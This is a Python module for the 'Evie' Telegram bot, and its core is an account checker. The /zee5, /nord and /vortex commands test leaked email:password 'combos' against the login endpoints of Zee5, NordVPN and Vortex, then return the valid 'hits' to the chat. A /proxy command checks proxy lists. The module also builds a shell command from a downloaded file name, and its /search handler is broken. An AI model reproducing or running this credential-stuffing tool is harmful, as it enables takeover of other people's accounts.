import os
import telethon
import requests
from telethon import TelegramClient, events, functions, Button
from telethon.tl.functions.users import GetFullUserRequest

from Evie import tbot, OWNER_ID, CMD_HELP
from youtube_search import YoutubeSearch
from Evie.events import register
sedpath = "./roseloverx/"
if not os.path.isdir(sedpath):
    os.makedirs(sedpath)

temp = './'

data = {
    "User-Agent": "NordApp android (playstore/2.8.6) Android 9.0.0",
    "Content-Length": "55",
    "Accept-Encoding": "gzip",
}

data2 = {"accept-encoding": "gzip", "user-agent": "RemotrAndroid/1.5.0"}


face = {
	"Accept-Encoding": "gzip, deflate, br",
	"Accept-Language": "en-US,en;q=0.9",
	"Connection": "keep-alive",
	"Content-Length": "136",
	"Content-Type": "application/json;charset=UTF-8",
	"Host": "userauth.voot.com",
	"Origin": "https://www.voot.com",
	"Referer": "https://www.voot.com",
	"Sec-Fetch-Dest": "empty",
	"Sec-Fetch-Mode": "cors",
	"Sec-Fetch-Site": "same-site",
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Edg/87.0.664.66"
}


@register(pattern="^/proxy$")
async def Devsexpo(event):
    ok = await event.reply(
        "Checking Proxies Please Wait."
    )
    pablo = await event.get_reply_message()
    if pablo == None:
        await ok.edit('Reply To File')
        return
    escobar = await tbot.download_media(pablo.media, temp)
    cmd = f"python3 -m PyProxyToolkit.Console -i {escobar} -o goood.txt -t 80 -x 20 -s httpbinStrategy"
    os.system(cmd)
    file = open("goood.txt", "r")
    Counter = 0
    Content = file.read()
    CoList = Content.split("\n")
    for i in CoList:
        if i:
            Counter += 1
    file.close()
    if Counter <= 0:
        await ok.edit(
            "Check Failed. Either Your File Has All Bad Proxies Or Your Proxy File Is Invalid."
        )
    elif Counter >= 1:
        file1 = open("goood.txt", "a")
        file1.write("\nChecked by MissEvie_Robot\n")
        file1.close()
        ok.delete()
        await tbot.send_file(
            event.chat_id,
            "goood.txt",
            caption=f"**Proxies Checked**\n**Good Proxies: ** {Counter}\n\n**Checked by MissEvie_Robot",
        )
        os.remove(escobar)
        os.remove("goood.txt")




@register(pattern="^/zee5 ?(.*)")
async def Devsexpo(event):
    input_str = event.pattern_match.group(1)
    if input_str == "combo":
        ok = await event.reply(
            "`Checking Your Combos File. This May Take Time Depending On No of Combos.`"
        )
        stark_dict = []
        hits_dict = []
        hits = 0
        bads = 0
        lol = await event.get_reply_message()
        if lol == None:
            await ok.edit('Reply To File')
            return
        starky = await tbot.download_media(lol.media, temp)
        with open(starky) as f:
            stark_dict = f.read().splitlines()
        if not event.sender_id == OWNER_ID:
          if len(stark_dict) > 30:
            await ok.edit("`Woah, Thats A Lot Of Combos. Keep 20 As Limit`")
            return
        os.remove(starky)
        for i in stark_dict:
            starkm = i.split(":")
            email = starkm[0]
            password = starkm[1]
            try:
                meke = requests.get(
                    f"https://userapi.zee5.com/v1/user/loginemail?email={email}&password={password}"
                ).json()
            except BaseException:
                meke = None
            if meke.get("token"):
                hits += 1
                hits_dict.append(f"{email}:{password}")
            else:
                bads += 1
        if len(hits_dict) == 0:
            await ok.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
            return
        with open("hits.txt", "w") as hitfile:
            for s in hits_dict:
                hitfile.write(s + " | @MissEvie_Robot\n")
        ok.delete()
        await tbot.send_file(
            event.chat_id,
            "hits.txt",
            caption=f"**!ZEE5 HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`",
        )
        os.remove("hits.txt")
    else:
        if input_str:
            if ":" in input_str:
                stark = input_str.split(":", 1)
            else:
                await event.reply("**! No Lol, use email:pass Regex !**")
                return
        else:
            await event.reply("**Give Combos To Check**")
            return
        email = stark[0]
        password = stark[1]
        meke = requests.get(
            f"https://userapi.zee5.com/v1/user/loginemail?email={email}&password={password}"
        ).json()
        beautifuln = f"""
**Checked Zee5 Account**
**Combo:** {email}:{password}
**Response:-** Invalid
"""

        beautiful = f"""
**Checked Zee5 Account**
**Combo:** {email}:{password}
**Response:-** Valid Account
**Login Here**: www.zee5.com
"""
        if meke.get("token"):
            await event.reply(beautiful)
        else:
            await event.reply(beautifuln)


@register(pattern="^/nord ?(.*)")
async def Devsexpo(event):
    input_str = event.pattern_match.group(1)
    if input_str == "combo":
        ok = await event.reply(
            "`Checking Your Combos File. This May Take Time Depending On No of Combos.`"
        )
        stark_dict = []
        hits_dict = []
        hits = 0
        bads = 0
        lol = await event.get_reply_message()
        if lol == None:
            await event.reply('Reply To File')
            return
        starky = await tbot.download_media(lol.media, temp)
        with open(starky) as f:
            stark_dict = f.read().splitlines()
        if len(stark_dict) > 30:
            await ok.edit("`Woah, Thats A Lot Of Combos. Keep 20 As Limit`")
            return
        os.remove(starky)
        for i in stark_dict:
            starkm = i.split(":")
            email = starkm[0]
            password = starkm[1]
            sedlyf = {"username": email, "password": password}
            try:
                meke = requests.post(
                    url="https://zwyr157wwiu6eior.com/v1/users/tokens",
                    headers=data,
                    json=sedlyf,
                ).json()
            except BaseException:
                meke = None
            if meke.get("token"):
                hits += 1
                hits_dict.append(f"{email}:{password}")
            else:
                bads += 1
        if len(hits_dict) == 0:
            await ok.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
            return
        with open("hits.txt", "w") as hitfile:
            for s in hits_dict:
                hitfile.write(s + " | @MissEvie_Robot")
        ok.delete()
        await tbot.send_file(
            event.chat_id,
            "hits.txt",
            caption=f"**!NORD HITS!** \n**Hits :** `{hits}` \n**Bad :** `{bads}`",
        )
        os.remove("hits.txt")
    else:
        if input_str:
            if ":" in input_str:
                stark = input_str.split(":", 1)
            else:
                await event.reply("**! No Lol, use email:pass Regex !**")
                return
        else:
            await event.reply("**Give Combos To Check**")
            return
        email = stark[0]
        password = stark[1]
        sedlyf = {"username": email, "password": password}
        meke = requests.post(
            url="https://zwyr157wwiu6eior.com/v1/users/tokens",
            headers=data,
            json=sedlyf,
        ).json()
        beautifuln = f"""
**Checked Nord Account**
**Combo:** {email}:{password}
**Response:-** Invalid
"""

        beautiful = f"""
**Checked Nord Account**
**Combo:** {email}:{password}
**Response:-** Valid Account
**Login Here**: www.nordvpn.com
"""
        if meke.get("token"):
            await event.reply(beautiful)
        else:
            await event.reply(beautifuln)


@register(pattern="^/vortex ?(.*)")
async def vortex(event):
    input_str = event.pattern_match.group(1)
    if input_str == "combo":
        ok = await event.reply(
            "`Checking Your Combos File. This May Take Time Depending On No of Combos.`"
        )
        stark_dict = []
        hits_dict = []
        hits = 0
        bads = 0
        lol = await event.get_reply_message()
        if lol == None:
            await event.reply('Reply To File')
            return
        starky = await tbot.download_media(lol.media, temp)
        with open(starky) as f:
            stark_dict = f.read().splitlines()
        if len(stark_dict) > 20:
            await ok.edit("`Woah, Thats A Lot Of Combos. Keep 20 As Limit`")
            return
        os.remove(starky)
        for i in stark_dict:
            starkm = i.split(":")
            email = starkm[0]
            password = starkm[1]
            sedlyf = {"username": email, "password": password}
            try:
                meke = requests.post(
                    url="https://vortex-api.gg/login", headers=data2, json=sedlyf
                ).json()
            except BaseException:
                meke = None
            if meke.get("token"):
                hits += 1
                hits_dict.append(f"{email}:{password}")
            else:
                bads += 1
        if len(hits_dict) == 0:
            await ok.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
            return
        with open("hits.txt", "w") as hitfile:
            for s in hits_dict:
                hitfile.write(s + " | @MissEvie_Bot")
        ok.delete()
        await tbot.send_file(
            event.chat_id,
            "hits.txt",
            caption=f"**!VORTEX HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`",
        )
        os.remove("hits.txt")
    else:
        if input_str:
            if ":" in input_str:
                stark = input_str.split(":", 1)
            else:
                await event.reply("**! No Lol, use email:pass Regex !**")
                return
        else:
            await event.reply("**Give Combos To Check**")
            return
        email = stark[0]
        password = stark[1]
        sedlyf = {"username": email, "password": password}
        meke = requests.post(
            url="https://vortex-api.gg/login", headers=data2, json=sedlyf
        ).json()
        beautifuln = f"""
**Checked Vortex Account**
**Combo:** {email}:{password}
**Response:-** Invalid
"""

        beautiful = f"""
**Checked Vortex Account**
**Combo:** {email}:{password}
**Response:-** Valid Account
**Login Here**: www.vortex.gg
"""
        if meke.get("token"):
            await event.reply(beautiful)
        else:
            await event.reply(beautifuln)

from Evie import StartTime, tbot, ubot
import datetime, time

def get_readable_time(seconds: int) -> str:
    count = 0
    ping_time = ""
    time_list = []
    time_suffix_list = ["s", "m", "h", "days"]

    while count < 4:
        count += 1
        if count < 3:
            remainder, result = divmod(seconds, 60)
        else:
            remainder, result = divmod(seconds, 24)
        if seconds == 0 and remainder == 0:
            break
        time_list.append(int(result))
        seconds = int(remainder)

    for x in range(len(time_list)):
        time_list[x] = str(time_list[x]) + time_suffix_list[x]
    if len(time_list) == 4:
        ping_time += time_list.pop() + ", "

    time_list.reverse()
    ping_time += ":".join(time_list)

    return ping_time



@register(pattern="^/(ping|ping@MissEvie_Robot)")
async def ping(event):
    start_time = datetime.datetime.now()
    message = await event.reply("Pinging.")
    end_time = datetime.datetime.now()
    pingtime = end_time - start_time
    telegram_ping = str(round(pingtime.total_seconds(), 2)) + "s"
    uptime = get_readable_time((time.time() - StartTime))
    await message.edit(
        "PONG !\n"
        "<b>Time Taken:</b> <code>{}</code>\n"
        "<b>Service uptime:</b> <code>{}</code>".format(telegram_ping, uptime),
        parse_mode="html",
    )

#RoseLoverX
from telethon import events
from telethon.tl import functions
from telethon.tl import types
import asyncio

async def inline_query(client, bot, query):
    from telethon import custom
    #RoseLoverX
    return custom.InlineResults(
        client,
        await client(
            functions.messages.GetInlineBotResultsRequest(
                bot=bot,
                peer="me",
                query=query,
                offset="",
                geo_point=types.InputGeoPointEmpty(),
            )
        ),
    )
@register(pattern="^/music (.*)")
async def lybot(event):
   k = event.pattern_match.group(1)
   async with tbot.conversation("@roseloverx") as bot_conv:
      response = bot_conv.wait_event(
                events.NewMessage(incoming=True, from_users="@RoseLoverx")
            )
      await (await inline_query(ubot, "@lybot", k))[0].click("@MissEvie_Robot")
      response = await response
      await response.forward_to(event.chat_id)
#RoseLoverX
@register(pattern="^/gey ?(.*)")
async def lybot(event):
   m = event.pattern_match.group(1)
   from telethon.tl.functions.users import GetFullUserRequest
   if event.reply_to_msg_id:
        previous_message = await event.get_reply_message()
        replied_user = await tbot(GetFullUserRequest(previous_message.sender_id))
        k = replied_user.user.first_name
   elif m:
        k = m
   else:
      sender = await event.get_sender()
      fname = sender.first_name
      k = fname
   async with tbot.conversation("@roseloverx") as bot_conv:
      response = bot_conv.wait_event(
                events.NewMessage(incoming=True, from_users="@RoseLoverx")
            )
      await (await inline_query(ubot, "@HowGayBot", k))[0].click("@MissEvie_Robot")
      response = await response
      await asyncio.sleep(1)
      await tbot.send_message(event.chat_id, response.text)

@register(pattern="^/shazam$")
async def _(event):
 try:
    if event.fwd_from:
        return
    if not event.reply_to_msg_id:
        await event.reply("Reply to an audio message.")
        return
    reply_message = await event.get_reply_message()
    stt = await event.reply("Identifying the song.")
    tmp = './'
    dl = await tbot.download_media(
            reply_message,
            tmp)
    chat = "@auddbot"
    await stt.edit("Identifying the song...")
    async with ubot.conversation(chat) as conv:
        try:
            await conv.send_file(dl)
            check = await conv.get_response()
            if not check.text.startswith("Audio received"):
                return await stt.edit("An error while identifying the song. Try to use a 5-10s long audio message.")
            await stt.edit("Wait just a sec...")
            result = await conv.get_response()
            await ubot.send_read_acknowledge(conv.chat_id)
        except Exception:
            await stt.edit("Error, Report at @Eviesupport")
            return
    namem = f"Song Name : {result.text.splitlines()[0]}\
        \n\nDetails : {result.text.splitlines()[2]}"
    await stt.edit(namem)
 except Exception as e:
      await event.reply(e)

@register(pattern="^/search (.*)")
async def lybot(event):
 k = event.pattern_match.group(1)
 message = f"/search {k}"
 results = YoutubeSearch(message,max_results=1).to_dict()
 i = 0
 text = ""
 while i < 1:
    text += f"Title - {results[i]['title']}\n"
    text += f"Duration - {results[i]['duration']}\n"
    text += f"Views - {results[i]['views']}\n"
    text += f"Channel - {results[i]['channel']}\n"
    text += f"https://youtube.com{results[i]['url_suffix']}\n\n"
    i += 1
    await event.reply(
                    reply,
                    link_preview=True,
                )


file_help = os.path.basename(__file__)
file_help = file_help.replace(".py", "")
file_helpo = file_help.replace("_", " ")

__help__ = """
 - /ping: ping the bot
 - /music: sends the requested Music
 - /gey: get geyness
 - /shazam: gets info about the given audio
**Help For Account Checker**
 - /zee5 <email:password> - Checks Zee5 
 - /zee5 combo - Reply To Combos File And Limit is 20.
 - /nord <email:password> - Checks One Account
 - /nord combo - Reply To Combos File And Limit is 20.
 - /vortex <email:password> - Checks One Account
 - /vortex combo - Reply To Combos File And Limit is 20.
 - /proxy - Reply To Proxy File Only, Check Your Proxies.
"""
CMD_HELP.update({file_helpo: [file_helpo, __help__]})
